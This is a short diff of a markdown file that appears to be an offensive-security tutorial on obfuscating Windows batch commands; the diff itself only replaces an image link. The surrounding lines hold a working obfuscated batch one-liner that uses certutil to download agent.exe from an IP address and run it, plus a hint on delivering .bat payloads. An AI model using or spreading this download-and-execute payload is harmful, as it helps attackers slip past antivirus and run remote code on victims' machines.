@@ -229,7 +229,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
       exit
 
-![batch obfuscation certutil.bat](http://i.cubeupload.com/PXBWog.jpg)
+![batch obfuscation certutil.bat](http://i68.tinypic.com/jsfuq1.jpg)
 `HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />
 
 ---
